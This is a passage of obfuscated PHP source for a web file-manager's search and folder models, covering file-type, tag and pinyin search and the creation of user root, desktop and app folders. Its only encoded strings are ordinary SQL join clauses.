$Ø½´¦«Ñ[$–Í´¨ßº[562]], $–Í´¨ßº[79] => $Ø½´¦«Ñ[$–Í´¨ßº[79]], $–Í´¨ßº[88] => time(), $–Í´¨ßº[548] => USER_ID); Model($–Í´¨ßº[939])->where(array($–Í´¨ßº[193] => $¾ã‚öÂ÷))->save($–â©‰¶ó); return $this->where(array($–Í´¨ßº[513] => $ùæâü¾ì))->delete(); } public function clearSame($Íè¸Ô—²) { $ò¾ìå”ù =& $_SERVER[Ï×Œõ”û]; $ÕÓ†şô = $this->listData($Íè¸Ô—²); $å¶›°à = array_to_keyvalue_group($ÕÓ†şô, $ò¾ìå”ù[562]); $³¡”¦‰¿ = array(); $´ËÃÈÌä = array(); foreach ($å¶›°à as $€Î„Ø¢×) { if (!$€Î„Ø¢× || count($€Î„Ø¢×) <= 1) { continue; } foreach ($€Î„Ø¢× as $É¤ªµ¬¡) { $³¡”¦‰¿[] = $É¤ªµ¬¡[$ò¾ìå”ù[562]]; $´ËÃÈÌä[] = $É¤ªµ¬¡[$ò¾ìå”ù[484]]; } } if (!$´ËÃÈÌä) { return; } $this->where(array($ò¾ìå”ù[484] => array($ò¾ìå”ù[7], $´ËÃÈÌä)))->delete(); Model($ò¾ìå”ù[565])->remove($³¡”¦‰¿); } public function userSpace() { $‚ò÷’  =& $_SERVER[Ï×Œõ”û]; $ÔºÀ‡ºı = $this->tablePrefix; $áÊ¤õæ = array($‚ò÷’ [1921] => USER_ID); $ûƒä‰ù„ = "{$ÔºÀ‡ºı}\151\157\x5f\x66\x69\154\x65\x20\146\x69\154\145\163\x20\157\156\40\146\151\154\x65\x73\x2e\146\x69\x6c\x65\111\x44\x20\x3d\x20\x68\151\x73\164\x6f\x72\x79\56\x66\x69\x6c\145\111\104"; return $this->alias($‚ò÷’ [2398])->where($áÊ¤õæ)->join($ûƒä‰ù„, $‚ò÷’ [2399])->sum($‚ò÷’ [79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($à³Àø‹¨) { $•¬îàˆ =& $_SERVER[Ï×Œõ”û]; $å‰å¾” = KodIO::fileTypeList(); $ÇÁİëÇ¾ = $å‰å¾”[$à³Àø‹¨]; if (!$ÇÁİëÇ¾) { return array(); } $›…ÏÁŒ = $ÇÁİëÇ¾[$•¬îàˆ[168]]; $øëˆÍôŒ = $•¬îàˆ[7]; if (!$ÇÁİëÇ¾[$•¬îàˆ[168]]) { $ñˆ° = array_to_keyvalue($å‰å¾”, $•¬îàˆ[12], $•¬îàˆ[168]); $›…ÏÁŒ = implode($•¬îàˆ[50], $ñˆ°); $øëˆÍôŒ = $•¬îàˆ[2401]; } $¦÷Ùóºş = explode($•¬îàˆ[50], trim($›…ÏÁŒ, $•¬îàˆ[50])); return array($øëˆÍôŒ, $¦÷Ùóºş); } public function listPathType($ë¢Ã¥») { $òãÖ¿ú =& $_SERVER[Ï×Œõ”û]; $ùÌÍïÖ¯ = $this->fileTypeWhere($ë¢Ã¥»); if (!$ùÌÍïÖ¯) { return array(); } $Ùï¹„‰ê = USER_ID; $•¯ø•Òù = Model($òãÖ¿ú[622])->getInfo($Ùï¹„‰ê); $¢ÚŞ·ùª = array($òãÖ¿ú[676] => SourceModel::TYPE_USER, $òãÖ¿ú[609] => array($òãÖ¿ú[640], $òãÖ¿ú[618] . $•¯ø•Òù[$òãÖ¿ú[90]][$òãÖ¿ú[193]] . $òãÖ¿ú[641]), $òãÖ¿ú[677] => $Ùï¹„‰ê, $òãÖ¿ú[674] => 0, $òãÖ¿ú[675] => $ùÌÍïÖ¯); return $this->listSource($¢ÚŞ·ùª); } public function listSearch($âËõËÊ, $›ÇŒÚå¨ = 300) { $ß¥™İèÏ =& $_SERVER[Ï×Œõ”û]; if (isset($âËõËÊ[$ß¥™İèÏ[2233]]) && $âËõËÊ[$ß¥™İèÏ[2233]]) { $âËõËÊ[$ß¥™İèÏ[2233]] = str_replace($ß¥™İèÏ[472], $ß¥™İèÏ[2402], trim($âËõËÊ[$ß¥™İèÏ[2233]])); } $š‹±·† = $this->_parseSearchWhere($âËõËÊ); if (!isset($š‹±·†[$ß¥™İèÏ[525]])) { $š‹±·†[$ß¥™İèÏ[525]] = 0; } $ï§ÑŠ«ö = $ß¥™İèÏ[2403]; $İ ´ü”¢ = $š‹±·†; $œ²©˜Óª = $ï§ÑŠ«ö; $this->_listSearchBindPinyin($âËõËÊ, $š‹±·†, $ï§ÑŠ«ö); $this->alias($ß¥™İèÏ[538])->_makeOrder(); $š‹±·† = $this->parseWhereLike($š‹±·†); $Ú¡”¬õ— = $this->distinct(!0)->field($ï§ÑŠ«ö)->where($š‹±·†)->selectPage($›ÇŒÚå¨); if ($GLOBALS[$ß¥™İèÏ[6]][$ß¥™İèÏ[469]][$ß¥™İèÏ[470]] && Input::check($âËõËÊ[$ß¥™İèÏ[2233]], $ß¥™İèÏ[683]) && $Ú¡”¬õ—[$ß¥™İèÏ[444]][$ß¥™İèÏ[430]] == 1 && $Ú¡”¬õ—[$ß¥™İèÏ[444]][$ß¥™İèÏ[445]] == 0) { $Ú¡”¬õ— = $this->distinct(!0)->field($ï§ÑŠ«ö)->where($İ ´ü”¢)->limit(1000)->select(); $Ú¡”¬õ— = array_page_split($Ú¡”¬õ—, !1, $›ÇŒÚå¨); } $this->_listSearchFileContent($Ú¡”¬õ—, $âËõËÊ, $œ²©˜Óª, $İ ´ü”¢); $this->_listSearchDesc($Ú¡”¬õ—, $âËõËÊ, $œ²©˜Óª); $this->_listSearchTag($Ú¡”¬õ—, $âËõËÊ, $œ²©˜Óª); $this->_listSearchGroupTag($Ú¡”¬õ—, $âËõËÊ, $œ²©˜Óª); $this->_listDataApply($Ú¡”¬õ—[$ß¥™İèÏ[447]]); $this->_listMake($Ú¡”¬õ—); return $Ú¡”¬õ—; } private function _listSearchFileContent(&$Šşğ²æ, $ËãÆå±“, $éä‘øÀ¹, $ü¤×§Ş‡) { $½ÇˆùÌÛ =& $_SERVER[Ï×Œõ”û]; if (!$ËãÆå±“[$½ÇˆùÌÛ[2233]] || $Šşğ²æ[$½ÇˆùÌÛ[444]][$½ÇˆùÌÛ[430]] > 1) { return; } if (!isset($ü¤×§Ş‡[$½ÇˆùÌÛ[32]]) || !is_array($ËãÆå±“[$½ÇˆùÌÛ[562]])) { return; } $ü¤×§Ş‡[$½ÇˆùÌÛ[562]] = array($½ÇˆùÌÛ[7], $ËãÆå±“[$½ÇˆùÌÛ[562]]); unset($ü¤×§Ş‡[$½ÇˆùÌÛ[32]]); unset($ËãÆå±“[$½ÇˆùÌÛ[562]]); $º®ŒŠĞ« = $this->field($éä‘øÀ¹)->where($ü¤×§Ş‡)->limit($½ÇˆùÌÛ[2404])->select(); if (!$º®ŒŠĞ« || count($º®ŒŠĞ«) == 0) { return; } $Šşğ²æ[$½ÇˆùÌÛ[447]] = array_merge($º®ŒŠĞ«, $Šşğ²æ[$½ÇˆùÌÛ[447]]); $Šşğ²æ[$½ÇˆùÌÛ[444]][$½ÇˆùÌÛ[445]] += count($º®ŒŠĞ«); } private function _listSearchTag(&$í§í§Î, $ßØ’œ”ª, $¿’‘°„Û) { $©ÅàØ¹ =& $_SERVER[Ï×Œõ”û]; if (empty($ßØ’œ”ª[$©ÅàØ¹[2099]]) || !in_array($©ÅàØ¹[2405], $ßØ’œ”ª[$©ÅàØ¹[2099]])) { return; } if (!$ßØ’œ”ª[$©ÅàØ¹[2233]] || $í§í§Î[$©ÅàØ¹[444]][$©ÅàØ¹[430]] > 1) { return; } $æ›Â¶³í = Model($©ÅàØ¹[2406])->listData(); $¹ÂËöæš = array(); $Ã”à £¼ = $ßØ’œ”ª[$©ÅàØ¹[2233]]; foreach ($æ›Â¶³í as $ºÑùÙÜç) { $°°ÆÂ´™ = $ºÑùÙÜç[$©ÅàØ¹[32]]; $İ‘Ã˜ñ = str_replace($©ÅàØ¹[53], $©ÅàØ¹[12], Pinyin::get($°°ÆÂ´™)); if (stripos($°°ÆÂ´™, $Ã”à £¼) !== !1 || stripos($İ‘Ã˜ñ, $Ã”à £¼) !== !1) { $¹ÂËöæš[] = $ºÑùÙÜç[$©ÅàØ¹[484]]; } } if (!$¹ÂËöæš) { return; } $­—ö´Çæ = array($©ÅàØ¹[520] => array($©ÅàØ¹[7], $¹ÂËöæš), $©ÅàØ¹[1547] => USER_ID); $×•­Ç‰ = Model($©ÅàØ¹[522])->field($©ÅàØ¹[87])->where($­—ö´Çæ)->select(); $×•­Ç‰ = array_to_keyvalue($×•­Ç‰, $©ÅàØ¹[12], $©ÅàØ¹[87]); $…àê™¶È = array_unique($×•­Ç‰); $this->_listSearchMerge($í§í§Î, $ßØ’œ”ª, $¿’‘°„Û, $…àê™¶È); } private function _listSearchDesc(&$ëâçî¶´, $ºµ³óÉ†, $Šî…‚º ) { $†ğ¶ù°Û =& $_SERVER[Ï×Œõ”û]; if (empty($ºµ³óÉ†[$†ğ¶ù°Û[2099]]) || !in_array($†ğ¶ù°Û[545], $ºµ³óÉ†[$†ğ¶ù°Û[2099]])) { return; } if (!$ºµ³óÉ†[$†ğ¶ù°Û[2233]] || $ëâçî¶´[$†ğ¶ù°Û[444]][$†ğ¶ù°Û[430]] > 1) { return; } $îÒÕíÜ = array($†ğ¶ù°Û[95] => $†ğ¶ù°Û[545], $†ğ¶ù°Û[452] => array($†ğ¶ù°Û[471], $†ğ¶ù°Û[2235] . $ºµ³óÉ†[$†ğ¶ù°Û[2233]] . $†ğ¶ù°Û[2235])); $€³·¼‡˜ = !1; if ($€³·¼‡˜) { $½–‚ƒ˜ = $this->listSearchChildren($ºµ³óÉ†[$†ğ¶ù°Û[192]]); $½–‚ƒ˜ = array_unique($½–‚ƒ˜); if (!$½–‚ƒ˜) { return; } $îÒÕíÜ[$†ğ¶ù°Û[193]] = array($†ğ¶ù°Û[7], $½–‚ƒ˜); } $¬´ƒ¤ Æ = Model($†ğ¶ù°Û[660])->field($†ğ¶ù°Û[193])->where($îÒÕíÜ)->limit(5000)->select(); $ôı–ªÒ = array_to_keyvalue($¬´ƒ¤ Æ, $†ğ¶ù°Û[12], $†ğ¶ù°Û[193]); $this->_listSearchMerge($ëâçî¶´, $ºµ³óÉ†, $Šî…‚º , $ôı–ªÒ); } private function _listSearchGroupTag(&$ÕŞşÓˆ, $í«š™íÈ, $ÚÑÑŞ) { $¨—€îˆ =& $_SERVER[Ï×Œõ”û]; if (empty($í«š™íÈ[$¨—€îˆ[2099]]) || !in_array($¨—€îˆ[2405], $í«š™íÈ[$¨—€îˆ[2099]])) { return; } if (!$í«š™íÈ[$¨—€îˆ[2233]] || $ÕŞşÓˆ[$¨—€îˆ[444]][$¨—€îˆ[430]] > 1 || !$í«š™íÈ[$¨—€îˆ[192]]) { return; } $Ùşà¡¯ = $this->sourceInfo($í«š™íÈ[$¨—€îˆ[192]]); if (!$Ùşà¡¯ || $Ùşà¡¯[$¨—€îˆ[190]] != SourceModel::TYPE_GROUP) { return; } $½îÅùÆˆ = $Ùşà¡¯[$¨—€îˆ[594]]; $ñÓĞûÖ = Model($¨—€îˆ[2407])->get($½îÅùÆˆ); $¸åğğ± = array(); $¨Õ…’ßî = $í«š™íÈ[$¨—€îˆ[2233]]; foreach ($ñÓĞûÖ[$¨—€îˆ[447]] as $´ğıéŞ§) { $•µ±íÍ– = $´ğıéŞ§[$¨—€îˆ[32]]; $Í˜Œ¯Ô÷ = str_replace($¨—€îˆ[53], $¨—€îˆ[12], Pinyin::get($•µ±íÍ–)); if (stripos($•µ±íÍ–, $¨Õ…’ßî) !== !1 || stripos($Í˜Œ¯Ô÷, $¨Õ…’ßî) !== !1) { $¸åğğ±[] = $´ğıéŞ§[$¨—€îˆ[484]]; } } if (!$¸åğğ±) { return; } $”‹È²…™ = array($¨—€îˆ[520] => array($¨—€îˆ[7], $¸åğğ±), $¨—€îˆ[1547] => 0, $¨—€îˆ[33] => $¨—€îˆ[1445] . $½îÅùÆˆ); $ù¶¿Åæı = Model($¨—€îˆ[522])->field($¨—€îˆ[87])->where($”‹È²…™)->select(); $ù¶¿Åæı = array_to_keyvalue($ù¶¿Åæı, $¨—€îˆ[12], $¨—€îˆ[87]); $à ­â÷Ä = array_unique($ù¶¿Åæı); $this->_listSearchMerge($ÕŞşÓˆ, $í«š™íÈ, $ÚÑÑŞ, $à ­â÷Ä); } private function _listSearchMerge(&$˜Ä±öù, $‚¾Ğ·ù×, $ª±¸”ı×, $çØ€®‰‘) { $Í¶ Šªú =& $_SERVER[Ï×Œõ”û]; if (!$çØ€®‰‘) { return; } $åÖß„ïÀ = array_to_keyvalue($˜Ä±öù[$Í¶ Šªú[447]], $Í¶ Šªú[12], $Í¶ Šªú[193]); $äÃ‹ĞÖÌ = array_diff($çØ€®‰‘, $åÖß„ïÀ); if (!$äÃ‹ĞÖÌ) { return; } $Íû¡ãÈ = array($Í¶ Šªú[193] => array($Í¶ Šªú[7], $äÃ‹ĞÖÌ)); $èÑ½Ÿó— = $this->field($ª±¸”ı×)->where($Íû¡ãÈ)->select(); if (!$èÑ½Ÿó—) { return; } $Ñ±´ÚÙá = array(); foreach ($èÑ½Ÿó— as $’ïÇá²À) { if ($this->_listSearchFilter($’ïÇá²À, $‚¾Ğ·ù×)) { $Ñ±´ÚÙá[] = $’ïÇá²À; } } $˜Ä±öù[$Í¶ Šªú[447]] = array_merge($Ñ±´ÚÙá, $˜Ä±öù[$Í¶ Šªú[447]]); $˜Ä±öù[$Í¶ Šªú[444]][$Í¶ Šªú[445]] += count($Ñ±´ÚÙá); } private function _listSearchFilter($õ¶æÜ»û, $Ãæì¡‰Ñ) { $…±‚“‡ =& $_SERVER[Ï×Œõ”û]; $Ã ¨ˆÑ = $õ¶æÜ»û[$…±‚“‡[505]] == $…±‚“‡[91]; if (!strstr($õ¶æÜ»û[$…±‚“‡[609]], $…±‚“‡[50] . $Ãæì¡‰Ñ[$…±‚“‡[192]] . $…±‚“‡[50])) { return !1; } if (isset($Ãæì¡‰Ñ[$…±‚“‡[506]]) && $Ãæì¡‰Ñ[$…±‚“‡[506]] != $…±‚“‡[885]) { if ($Ãæì¡‰Ñ[$…±‚“‡[506]] == $…±‚“‡[78] && !$Ã ¨ˆÑ) { return !1; } if ($Ãæì¡‰Ñ[$…±‚“‡[506]] != $…±‚“‡[78] && $Ã ¨ˆÑ) { return !1; } if (!strstr($õ¶æÜ»û[$…±‚“‡[168]], $…±‚“‡[50] . $Ãæì¡‰Ñ[$…±‚“‡[506]] . $…±‚“‡[50])) { return !1; } } if (isset($Ãæì¡‰Ñ[$…±‚“‡[2408]]) && $Ãæì¡‰Ñ[$…±‚“‡[2408]] < $õ¶æÜ»û[$…±‚“‡[79]]) { return !1; } if (isset($Ãæì¡‰Ñ[$…±‚“‡[2409]]) && $Ãæì¡‰Ñ[$…±‚“‡[2409]] > $õ¶æÜ»û[$…±‚“‡[79]]) { return !1; } if (isset($Ãæì¡‰Ñ[$…±‚“‡[690]]) && $Ãæì¡‰Ñ[$…±‚“‡[690]] != $õ¶æÜ»û[$…±‚“‡[548]]) { return !1; } return !0; } public function listSearchChildren($¡‹ÛæÓ“, $ù®øæÔ = 5000) { $ÇÉÑÂó“ =& $_SERVER[Ï×Œõ”û]; $¼Û™ã¨Ä = array(); $ïÔœõğÓ = $this->sourceInfo($¡‹ÛæÓ“); $‘àï½— = array($ÇÉÑÂó“[609] => array($ÇÉÑÂó“[471], $ïÔœõğÓ[$ÇÉÑÂó“[609]] . $ïÔœõğÓ[$ÇÉÑÂó“[193]] . $ÇÉÑÂó“[641])); $šİšÄ¸× = $this->field($ÇÉÑÂó“[79])->where($‘àï½—)->limit($ù®øæÔ + 1)->select(); $…”…Üšë = is_array($šİšÄ¸×) ? count($šİšÄ¸×) : 0; if ($…”…Üšë > $ù®øæÔ) { return $this->_listSearchChildrenNear($¡‹ÛæÓ“, $ù®øæÔ); } $®–ìşä½ = $this->field($ÇÉÑÂó“[193])->where($‘àï½—)->select(); $¼Û™ã¨Ä = array_to_keyvalue($®–ìşä½, $ÇÉÑÂó“[12], $ÇÉÑÂó“[193]); return $¼Û™ã¨Ä; } private function _listSearchChildrenNear($ìø×³ò, $‚°×ôùä) { $îé€·î™ =& $_SERVER[Ï×Œõ”û]; $ç˜•ğ¦ = array(); $åÇ—ÈÀ‡ = array($îé€·î™[192] => $ìø×³ò); $¨¹ÈÖ¦³ = $this->field($îé€·î™[2410])->where($åÇ—ÈÀ‡)->select(); $ñöš¬äƒ = array_to_keyvalue(array_filter_by_field($¨¹ÈÖ¦³, $îé€·î™[505], $îé€·î™[91]), $îé€·î™[12], $îé€·î™[193]); $ç˜•ğ¦ = array_merge($ç˜•ğ¦, array_to_keyvalue($¨¹ÈÖ¦³, $îé€·î™[12], $îé€·î™[193])); if (!$ñöš¬äƒ) { return $ç˜•ğ¦; } $åÇ—ÈÀ‡ = array($îé€·î™[192] => array($îé€·î™[7], $ñöš¬äƒ)); $¨¹ÈÖ¦³ = $this->field($îé€·î™[2410])->where($åÇ—ÈÀ‡)->limit($‚°×ôùä)->select(); $ç˜•ğ¦ = array_merge($ç˜•ğ¦, array_to_keyvalue($¨¹ÈÖ¦³, $îé€·î™[12], $îé€·î™[193])); $ç˜•ğ¦ = array_slice($ç˜•ğ¦, 0, intval($‚°×ôùä)); return $ç˜•ğ¦; } private function _listSearchBindPinyin($º˜¬ıÑş, &$‡íÒ¤¥Ş, &$ÆåÁ–œ¡) { $×””»Ìî =& $_SERVER[Ï×Œõ”û]; if (!isset($º˜¬ıÑş[$×””»Ìî[2233]]) || !$º˜¬ıÑş[$×””»Ìî[2233]]) { return; } if (!Input::check($º˜¬ıÑş[$×””»Ìî[2233]], $×””»Ìî[395]) || strlen($º˜¬ıÑş[$×””»Ìî[2233]]) < 2) { return; } $Áá³¤ÛÅ = "\x4c\x45\106\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\157\137\163\157\x75\162\143\145\x5f\x6d\x65\164\x61\40\x6d\145\164\x61\x20\x6f\156\x20\163\x6f\x75\x72\143\x65\x2e\x73\157\165\x72\x63\145\x49\104\40\x3d\40\155\x65\164\141\x2e\x73\157\x75\x72\143\145\x49\x44"; $Õ˜İªÓä = array(); $ÆåÁ–œ¡ = str_replace(array($×””»Ìî[287], $×””»Ìî[53], $×””»Ìî[2411]), $×””»Ìî[12], $ÆåÁ–œ¡); $ÆåÁ–œ¡ = $×””»Ìî[530] . str_replace($×””»Ìî[50], $×””»Ìî[531], $ÆåÁ–œ¡); $ûãà‡Ö™ = $‡íÒ¤¥Ş[$×””»Ìî[32]]; unset($‡íÒ¤¥Ş[$×””»Ìî[32]]); foreach ($‡íÒ¤¥Ş as $‹ûñæÍÛ => $±ş‘Ãò) { $Õ˜İªÓä[$×””»Ìî[530] . $‹ûñæÍÛ] = $±ş‘Ãò; } foreach ($ûãà‡Ö™ as $—µ¼ıı…) { $Õ˜İªÓä[] = array($×””»Ìî[535] => $—µ¼ıı…, $×””»Ìî[1121] => $×””»Ìî[2237], array($×””»Ìî[2412] => $—µ¼ıı…, $×””»Ìî[2413] => array($×””»Ìî[7], array($×””»Ìî[557], $×””»Ìî[556])))); } $this->join($Áá³¤ÛÅ); $‡íÒ¤¥Ş = $Õ˜İªÓä; } private function _parseSearchWhere($éıÈÌÑâ) { $™œì½ˆİ =& $_SERVER[Ï×Œõ”û]; $›ÌÏ€×— = array(); if (isset($éıÈÌÑâ[$™œì½ˆİ[867]]) && $éıÈÌÑâ[$™œì½ˆİ[867]]) { $›ÌÏ€×—[$™œì½ˆİ[88]] = array($™œì½ˆİ[2414], $éıÈÌÑâ[$™œì½ˆİ[867]]); } if (isset($éıÈÌÑâ[$™œì½ˆİ[868]]) && $éıÈÌÑâ[$™œì½ˆİ[868]]) { $â±Äµî = array($™œì½ˆİ[2415], $éıÈÌÑâ[$™œì½ˆİ[868]]); if ($›ÌÏ€×—[$™œì½ˆİ[88]]) { $›ÌÏ€×—[$™œì½ˆİ[88]] = array($›ÌÏ€×—[$™œì½ˆİ[88]], $â±Äµî, $™œì½ˆİ[2416]); } else { $›ÌÏ€×—[$™œì½ˆİ[88]] = $â±Äµî; } } if (isset($éıÈÌÑâ[$™œì½ˆİ[2408]]) && $éıÈÌÑâ[$™œì½ˆİ[2408]] > 0) { $›ÌÏ€×—[$™œì½ˆİ[79]] = array($™œì½ˆİ[2414], $éıÈÌÑâ[$™œì½ˆİ[2408]]); } if (isset($éıÈÌÑâ[$™œì½ˆİ[2409]]) && $éıÈÌÑâ[$™œì½ˆİ[2409]]) { $â±Äµî = array($™œì½ˆİ[2415], $éıÈÌÑâ[$™œì½ˆİ[2409]]); if ($›ÌÏ€×—[$™œì½ˆİ[79]]) { $›ÌÏ€×—[$™œì½ˆİ[79]] = array($›ÌÏ€×—[$™œì½ˆİ[79]], $â±Äµî, $™œì½ˆİ[2416]); } else { $›ÌÏ€×—[$™œì½ˆİ[79]] = $â±Äµî; } } if (isset($éıÈÌÑâ[$™œì½ˆİ[690]]) && $éıÈÌÑâ[$™œì½ˆİ[690]]) { $›ÌÏ€×—[] = array($™œì½ˆİ[548] => $éıÈÌÑâ[$™œì½ˆİ[690]], $™œì½ˆİ[546] => $éıÈÌÑâ[$™œì½ˆİ[690]], $™œì½ˆİ[1121] => $™œì½ˆİ[2237]); } if (isset($éıÈÌÑâ[$™œì½ˆİ[506]]) && $éıÈÌÑâ[$™œì½ˆİ[506]]) { $•äõå£° = $éıÈÌÑâ[$™œì½ˆİ[506]]; if ($•äõå£° == $™œì½ˆİ[78]) { $›ÌÏ€×—[$™œì½ˆİ[505]] = 1; } else { if ($•äõå£° == $™œì½ˆİ[2417]) { $›ÌÏ€×—[$™œì½ˆİ[505]] = 0; } else { if ($•äõå£°) { $•äõå£° = is_array($•äõå£°) ? $•äõå£° : explode($™œì½ˆİ[50], $•äõå£°); $›ÌÏ€×—[$™œì½ˆİ[506]] = array($™œì½ˆİ[512], $•äõå£°); $›ÌÏ€×—[$™œì½ˆİ[505]] = 0; } } } } $this->_parseSearchParent($éıÈÌÑâ, $›ÌÏ€×—); if (isset($éıÈÌÑâ[$™œì½ˆİ[2233]]) && trim($éıÈÌÑâ[$™œì½ˆİ[2233]])) { $ò¼ÌÃ³ = trim($éıÈÌÑâ[$™œì½ˆİ[2233]]); $ƒï‹ç¯¶ = explode($™œì½ˆİ[53], $ò¼ÌÃ³); if (strlen($ò¼ÌÃ³) > 2 && (substr($ò¼ÌÃ³, 0, 1) == $™œì½ˆİ[119] && substr($ò¼ÌÃ³, -1) == $™œì½ˆİ[119]) || substr($ò¼ÌÃ³, 0, 1) == $™œì½ˆİ[58] && substr($ò¼ÌÃ³, -1) == $™œì½ˆİ[58]) { $ò¼ÌÃ³ = substr($ò¼ÌÃ³, 1, -1); $ƒï‹ç¯¶ = array($ò¼ÌÃ³); } $›ÌÏ€×—[$™œì½ˆİ[32]] = array(array($™œì½ˆİ[640], $™œì½ˆİ[2235] . $ò¼ÌÃ³ . $™œì½ˆİ[2235])); if (count($ƒï‹ç¯¶) > 1) { $›ÌÏ€×—[$™œì½ˆİ[32]] = array(); foreach ($ƒï‹ç¯¶ as $ÂÁúÛ¾È) { if (!trim($ÂÁúÛ¾È)) { continue; } $›ÌÏ€×—[$™œì½ˆİ[32]][] = array($™œì½ˆİ[640], $™œì½ˆİ[2235] . trim($ÂÁúÛ¾È) . $™œì½ˆİ[2235]); } } } return $›ÌÏ€×—; } private function _parseSearchParent($½é¯Ó®, &$åºÚ³) { $ŠÁ´û°– =& $_SERVER[Ï×Œõ”û]; if (!isset($½é¯Ó®[$ŠÁ´û°–[192]]) || !$½é¯Ó®[$ŠÁ´û°–[192]]) { return; } $Ã¢×ÙĞø = $this->pathInfo($½é¯Ó®[$ŠÁ´û°–[192]]); $®šÈ¦Ï = $Ã¢×ÙĞø[$ŠÁ´û°–[192]] . $ŠÁ´û°–[12] === $ŠÁ´û°–[230]; $öŞşˆô¨ = $Ã¢×ÙĞø[$ŠÁ´û°–[190]] == $ŠÁ´û°–[603]; if ($Ã¢×ÙĞø[$ŠÁ´û°–[619]] == $ŠÁ´û°–[620]) { $µô‹³ãÌ = $this->sourceInfo($½é¯Ó®[$ŠÁ´û°–[192]]); $Ã¢×ÙĞø[$ŠÁ´û°–[609]] = $µô‹³ãÌ[$ŠÁ´û°–[609]]; } $åºÚ³[$ŠÁ´û°–[680]] = array($ŠÁ´û°–[640], $Ã¢×ÙĞø[$ŠÁ´û°–[609]] . $½é¯Ó®[$ŠÁ´û°–[192]] . $ŠÁ´û°–[641]); $¼ö¢Æçí = isset($½é¯Ó®[$ŠÁ´û°–[2099]]) && in_array($ŠÁ´û°–[603], $½é¯Ó®[$ŠÁ´û°–[2099]]); if (!$¼ö¢Æçí || !$öŞşˆô¨ || !$®šÈ¦Ï || !$Ã¢×ÙĞø[$ŠÁ´û°–[507]]) { return; } if (!AuthModel::authCheckRoot($Ã¢×ÙĞø[$ŠÁ´û°–[507]][$ŠÁ´û°–[508]])) { return; } $‘ºÛŒÍµ = $Ã¢×ÙĞø[$ŠÁ´û°–[594]] . $ŠÁ´û°–[12]; if ($‘ºÛŒÍµ == $ŠÁ´û°–[91]) { unset($åºÚ³[$ŠÁ´û°–[680]]); $åºÚ³[$ŠÁ´û°–[190]] = self::TYPE_GROUP; return; } $€ªàåĞÛ = Model($ŠÁ´û°–[610])->groupChildrenAll($‘ºÛŒÍµ); $»ÍôÛÑÓ = count($€ªàåĞÛ); if ($»ÍôÛÑÓ <= 1) { return; } $Îãã—ò± = array($ŠÁ´û°–[192] => 0, $ŠÁ´û°–[190] => self::TYPE_GROUP, $ŠÁ´û°–[594] => array($ŠÁ´û°–[7], $€ªàåĞÛ)); $Ç‘²‰âç = $this->field($ŠÁ´û°–[2418])->where($Îãã—ò±)->limit($»ÍôÛÑÓ)->select(); $åºÚ³[$ŠÁ´û°–[680]] = array(); foreach ($Ç‘²‰âç as $Ñ ·’È±) { $åºÚ³[$ŠÁ´û°–[680]][] = array($ŠÁ´û°–[640], $ŠÁ´û°–[618] . $Ñ ·’È±[$ŠÁ´û°–[193]] . $ŠÁ´û°–[641]); } $åºÚ³[$ŠÁ´û°–[680]][] = $ŠÁ´û°–[2237]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($€‚›··Ì) { $¯¶¹Õ† =& $_SERVER[Ï×Œõ”û]; $Óû–ê½ = Model($¯¶¹Õ†[602])->where(array($¯¶¹Õ†[1921] => $€‚›··Ì))->find(); $²Åøñ×ò = $this->_mkdirRoot(SourceModel::TYPE_USER, $€‚›··Ì, $Óû–ê½[$¯¶¹Õ†[32]]); $this->userDesktopAdd($²Åøñ×ò); return $²Åøñ×ò; } public function userDesktopAdd($Û¯Î£‡) { $÷ÛøË²ñ =& $_SERVER[Ï×Œõ”û]; $ÙÌÓÚ¢ = LNG($÷ÛøË²ñ[2419]); $Ë–³’›Ë = $this->mkdir($Û¯Î£‡, $ÙÌÓÚ¢); $this->metaSet($Ë–³’›Ë, $÷ÛøË²ñ[2420], $÷ÛøË²ñ[91]); $this->metaSet($Û¯Î£‡, $÷ÛøË²ñ[2421], $Ë–³’›Ë); } public function userPathSafeAdd($á„ÒØĞ‚) { $‡Ç§•›ã =& $_SERVER[Ï×Œõ”û]; $ğ•À‹è = Model($‡Ç§•›ã[602])->getInfoFull($á„ÒØĞ‚); if (!$ğ•À‹è) { return !1; } if (_get($ğ•À‹è, $‡Ç§•›ã[623])) { return $ğ•À‹è[$‡Ç§•›ã[560]][$‡Ç§•›ã[2422]]; } $†©ÎÂİø = $this->_mkdirRoot(SourceModel::TYPE_USER, $á„ÒØĞ‚, $‡Ç§•›ã[2423], $‡Ç§•›ã[2424]); Model($‡Ç§•›ã[602])->metaSet($á„ÒØĞ‚, $‡Ç§•›ã[2422], $†©ÎÂİø); $this->metaSet($†©ÎÂİø, $‡Ç§•›ã[2425], $á„ÒØĞ‚); return $†©ÎÂİø; } public function userPathAppAdd($ÑäÊÛõ±, $ÚÑƒğ¾ˆ = '', $æ‘ß‰ ² = '') { $©ßƒ–ç¯ =& $_SERVER[Ï×Œõ”û]; $€‹ï¾£† = Model($©ßƒ–ç¯[602])->getInfoFull($ÑäÊÛõ±); if (!$€‹ï¾£†) { return !1; } $š”ĞÒê = $€‹ï¾£†[$©ßƒ–ç¯[560]] ? $€‹ï¾£†[$©ßƒ–ç¯[560]] : array(); $•Àû‰¨ç = $š”ĞÒê[$©ßƒ–ç¯[2426]]; if (!$•Àû‰¨ç) { $•Àû‰¨ç = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÑäÊÛõ±, $©ßƒ–ç¯[2427], $©ßƒ–ç¯[2428]); Model($©ßƒ–ç¯[602])->metaSet($ÑäÊÛõ±, $©ßƒ–ç¯[2426], $•Àû‰¨ç . $©ßƒ–ç¯[12]); $this->metaSet($•Àû‰¨ç, $©ßƒ–ç¯[2426], $ÑäÊÛõ±); } if (!$ÚÑƒğ¾ˆ) { return $•Àû‰¨ç; } $ğ¬Œ½Ö  = $š”ĞÒê[$©ßƒ–ç¯[2429] . $ÚÑƒğ¾ˆ]; if (!$ğ¬Œ½Ö ) { $ğ¬Œ½Ö  = $this->mkdir($•Àû‰¨ç, $ÚÑƒğ¾ˆ); Model($©ßƒ–ç¯[602])->metaSet($ÑäÊÛõ±, $©ßƒ–ç¯[2429] . $ÚÑƒğ¾ˆ, $ğ¬Œ½Ö ); $this->metaSet($ğ¬Œ½Ö , $©ßƒ–ç¯[2429] . $ÚÑƒğ¾ˆ, $ÑäÊÛõ±); } if (!$æ‘ß‰ ²) { return $ğ¬Œ½Ö ; } $¿¶µû– = $this->mkdir($ğ¬Œ½Ö , 